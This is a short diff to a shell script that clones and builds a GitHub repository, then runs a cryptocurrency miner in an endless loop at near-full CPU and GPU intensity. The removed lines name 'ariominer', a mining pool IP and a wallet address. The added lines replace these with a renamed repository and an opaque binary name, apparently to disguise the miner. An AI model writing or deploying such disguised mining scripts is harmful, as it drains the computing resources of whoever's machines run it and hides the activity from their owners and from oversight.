@@ -1,5 +1,5 @@
-git clone https://github.com/mobileapps84741274/blueinc84747474
-cd ./blueinc84747474/
+git clone https://github.com/mobileapps84741274/linux88
+cd ./linux88/
 mkdir build
 cd build
 cmake ..
@@ -8,6 +8,6 @@ make
 while true
 do
 
-./ariominer --mode miner --pool http://135.181.63.177 --wallet 3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3 --name linux8474 --cpu-intensity 98 --gpu-intensity-cblocks 98 --gpu-intensity-gblocks 98
+./linux848888888874 web8474
 
 done
